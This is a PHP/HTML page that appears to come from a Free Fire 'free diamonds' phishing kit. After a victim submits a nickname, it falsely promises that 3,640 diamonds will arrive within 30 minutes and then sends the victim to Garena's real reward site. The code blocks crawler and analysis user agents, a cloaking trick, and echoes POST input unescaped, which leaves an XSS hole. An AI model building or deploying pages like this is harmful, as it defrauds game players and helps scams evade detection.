<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}
$nn = $_POST['nickk'];
$r = $_POST['skinn'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="./assets/css/miraipedia.css">
    <link rel="stylesheet" href="./assets/css/animate.css">
    <link rel="shorcut icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png"/>
    <title>Selamat <?php echo $nn;?></title>
</head>
<body>
    
<iframe scrolling="no" allow="autoplay" src="https://e.top4top.net/m_1163eammp1.mp3" width="0" height="0" frameborder="no"></iframe>    
    
    <div class="miraipedia">
        <div class="contentmirai">
            <div class="content-txt">
                <img class="img-contentmirai" alt="miraipedia" src="./assets/images/uhulogo.png">
                Terima Kasih<br>Diamond anda Akan Masuk Setelah 30 Menit, Harap tunggu
                <p>
                Diamond yang anda pilih adalah :<br> Diamond x 3,640
                    <form action="https://reward.ff.garena.com/">
                        <button type="submit" class="btn-contentmirai">KELUAR</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>
</html>